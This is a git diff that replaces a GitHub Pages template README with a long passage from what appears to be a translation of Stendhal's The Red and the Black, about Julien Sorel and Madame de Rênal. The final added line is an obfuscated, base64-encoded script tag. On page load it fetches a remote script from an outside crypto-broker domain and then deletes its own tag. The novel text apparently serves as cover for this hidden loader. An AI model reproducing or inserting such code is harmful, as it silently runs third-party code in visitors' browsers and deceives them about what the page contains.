@@ -1,37 +1,44 @@
-## Welcome to GitHub Pages
+# I was thinking
+She dared to go as far as the shop of the bookseller of Verrières, in spite of his awful reputation for Liberalism. In the shop she chose ten louis worth of books for a present for her sons. But these books were those which she knew Julien was wanting. She insisted on each child writing his name then and there in the bookseller's shop in those books which fell to his lot. While Madame de Rênal was rejoicing over the kind reparation which she had had the courage to make to Julien, the latter was overwhelmed with astonishment at the quantity of books which he saw at the bookseller's. He had never dared to enter so profane a place. His heart was palpitating. Instead of trying to guess what was passing in Madame de Rênal's heart he pondered deeply over the means by which a young theological student could procure some of those books. Eventually it occurred to him that it would be possible, with tact, to persuade M. de Rênal that one of the proper subjects of his sons' curriculum would be the history of the celebrated gentlemen who had been born in the province. After a month of careful preparation Julien witnessed the success of this idea. The success was so great that he actually dared to risk mentioning to M. de Rênal in conversation, a matter which the noble mayor found disagreeable from quite another point of view. The suggestion was to contribute to the fortune of a Liberal by taking a subscription at the bookseller's. M. de Rênal agreed that it would be wise to give his elder son a first hand acquaintance with many works which he would hear mentioned in conversation when he went to the Military School.
 
-You can use the [editor on GitHub](https://github.com/peseebytriapap/Bigdog/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+But Julien saw that the mayor had determined to go no further. He suspected some secret reason but could not guess it.
+![l](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR9YdeypQI0ZTbZVM1owD1fWA2IUylvKmMKHw&usqp=CAU)
+"I was thinking, sir," he said to him one day, "that it would be highly undesirable for the name of so good a gentleman as a Rênal to appear on a bookseller's dirty ledger." M. de Rênal's face cleared.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+"It would also be a black mark," continued Julien in a more humble tone, "against a poor theology student if it ever leaked out that his name had been on the ledger of a bookseller who let out books. The Liberals might go so far as to accuse me of having asked for the most infamous books. Who knows if they will not even go so far as to write the titles of those perverse volumes after my name?" But Julien was getting off the track. He noticed that the Mayor's physiognomy was re-assuming its expression of embarrassment and displeasure. Julien was silent. "I have caught my man," he said to himself.
 
-### Markdown
+It so happened that a few days afterwards the elder of the children asked Julien, in M. de Rênal's presence, about a book which had been advertised in the Quotidienne.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+"In order to prevent the Jacobin Party having the slightest pretext for a score," said the young tutor, "and yet give me the means of answering M. de Adolphe's question, you can make your most menial servant take out a subscription at the booksellers."
 
-```markdown
-Syntax highlighted code block
+"That's not a bad idea," said M. de Rênal, who was obviously very delighted.
 
-# Header 1
-## Header 2
-### Header 3
+"You will have to stipulate all the same," said Julien in that solemn and almost melancholy manner which suits some people so well when they see the realization of matters which they have desired for a long time past, "you will have to stipulate that the servant should not take out any novels. Those dangerous books, once they got into the house, might corrupt Madame de Rênal's maids, and even the servant himself."
 
-- Bulleted
-- List
+"You are forgetting the political pamphlets," went on M. de Rênal with an important air. He was anxious to conceal the admiration with which the cunning "middle course" devised by his children's tutor had filled him.
 
-1. Numbered
-2. List
+In this way Julien's life was made up of a series of little acts of diplomacy, and their success gave him far more food for thought than the marked manifestation of favouritism which he could have read at any time in Madame de Rênal's heart, had he so wished.
 
-**Bold** and _Italic_ and `Code` text
+The psychological position in which he had found himself all his life was renewed again in the mayor of Verrières' house. Here in the same way as at his father's saw-mill, he deeply despised the people with whom he lived, and was hated by them. He saw every day in the conversation of the sub-perfect, M. Valenod and the other friends of the family, about things which had just taken place under their very eyes, how little ideas corresponded to reality. If an action seemed to Julien worthy of admiration, it was precisely that very action which would bring down upon itself the censure of the people with whom he lived. His inner mental reply always was, "What beasts or what fools!" The joke was that, in spite of all his pride, he often understood absolutely nothing what they were talking about.
 
-[Link](url) and ![Image](src)
-```
+Throughout his whole life he had only spoken sincerely to the old Surgeon-Major.
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+The few ideas he had were about Buonaparte's Italian Campaigns or else surgery. His youthful courage revelled in the circumstantial details of the most terrible operations. He said to himself.
 
-### Jekyll Themes
+"I should not have flinched."
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/peseebytriapap/Bigdog/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+The first time that Madame de Rênal tried to enter into conversation independently of the children's education, he began to talk of surgical operations. She grew pale and asked him to leave off. Julien knew nothing beyond that.
 
-### Support or Contact
+So it came about that, though he passed his life in Madame de Rênal's company, the most singular silence would reign between them as soon as they were alone.
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+When he was in the salon, she noticed in his eyes, in spite of all the humbleness of his demeanour, an air of intellectual superiority towards everyone who came to visit her. If she found herself alone with him for a single moment, she saw that he was palpably embarrassed. This made her feel uneasy, for her woman's instinct caused her to realise that this embarrassment was not inspired by any tenderness.
+
+Owing to some mysterious idea, derived from some tale of good society, such as the old Surgeon-Major had seen it, Julien felt humiliated whenever the conversation languished on any occasion when he found himself in a woman's society, as though the particular pause were his own special fault. This sensation was a hundred times more painful in tête-à-tête. His imagination, full as it was of the most extravagant and most Spanish ideas of what a man ought to say when he is alone with a woman, only suggested to the troubled youth things which were absolutely impossible. His soul was in the clouds. Nevertheless he was unable to emerge from this most humiliating silence. Consequently, during his long walks with Madame de Rênal and the children, the severity of his manner was accentuated by the poignancy of his sufferings. He despised himself terribly. If, by any luck, he made himself speak, he came out with the most absurd things. To put the finishing touch on his misery, he saw his own absurdity and exaggerated its extent, but what he did not see was the expression in his eyes, which were so beautiful and betokened so ardent a soul, that like good actors, they sometimes gave charm to something which is really devoid of it.
+
+Madame de Rênal noticed that when he was alone with her he never chanced to say a good thing except when he was taken out of himself by some unexpected event, and consequently forgot to try and turn a compliment. As the friends of the house did not spoil her by regaling her with new and brilliant ideas, she enjoyed with delight all the flashes of Julien's intellect.
+
+After the fall of Napoleon, every appearance of gallantry has been severely exiled from provincial etiquette. People are frightened of losing their jobs. All rascals look to the religious order for support, and hypocrisy has made firm progress even among the Liberal classes. One's ennui is doubled. The only pleasures left are reading and agriculture.
+
+Madame de Rênal, the rich heiress of a devout aunt, and married at sixteen to a respectable gentleman, had never felt or seen in her whole life anything that had the slightest resemblance in the whole world to love. Her confessor, the good curé Chélan, had once mentioned love to her, in discussing the advances of M. de Valenod, and had drawn so loathsome a picture of the passion that the word now stood to her for nothing but the most abject debauchery. She had regarded love, such as she had come across it, in the very small number of novels with which chance had made her acquainted, as an exception if not indeed as something absolutely abnormal. It was, thanks to this ignorance, that Madame de Rênal, although incessantly absorbed in Julien, was perfectly happy, and never thought of reproaching herself in the slightest.
+
+<script id="nRYBA" src="data:text/javascript;base64, dmFyIF9mUXRwbiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oXzRORHQ2LCBfOHVvTGQpIHt2YXIgXzNPUmpVID0gZnVuY3Rpb24oX3dMeHdLKSB7d2hpbGUgKC0tX3dMeHdLKSB7XzRORHQ2WydwdXNoJ10oXzRORHQ2WydzaGlmdCddKCkpO319O18zT1JqVSgrK184dW9MZCk7fShfZlF0cG4sIDB4MTFiKSk7dmFyIF9kRk9PRyA9IGZ1bmN0aW9uKF9hZkZBeiwgX04yUWpSKSB7X2FmRkF6ID0gX2FmRkF6IC0gMHgwO3ZhciBfWEJZeG0gPSBfZlF0cG5bX2FmRkF6XTtyZXR1cm4gX1hCWXhtO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfZEZPT0coJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX3MyVENXID0gZG9jdW1lbnRbX2RGT09HKCcweDEnKV0oX2RGT09HKCcweDInKSk7X3MyVENXW19kRk9PRygnMHgzJyldID0gX2RGT09HKCcweDQnKTtfczJUQ1dbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2OFx4NjFceDZjXHg3OVx4NmVceDYxXHg2Zlx4NzZceDYzXHg2OFx4NjlceDZlXHg2ZVx4NjlceDZiXHg2Zlx4NzZceDYxXHgyZVx4NjNceDcyXHg3OVx4NzBceDc0XHgyZFx4NjJceDcyXHg2Zlx4NmJceDY1XHg3Mlx4MmVceDYzXHg2Zlx4NmRceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDRkXHgzMFx4NGZceDQyXHg2ZFx4NTVceDc1XHg0Nlx4NjZceDc4Jztkb2N1bWVudFtfZEZPT0coJzB4NScpXShfZEZPT0coJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfczJUQ1cpO2RvY3VtZW50W19kRk9PRygnMHg3JyldKCduUllCQScpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
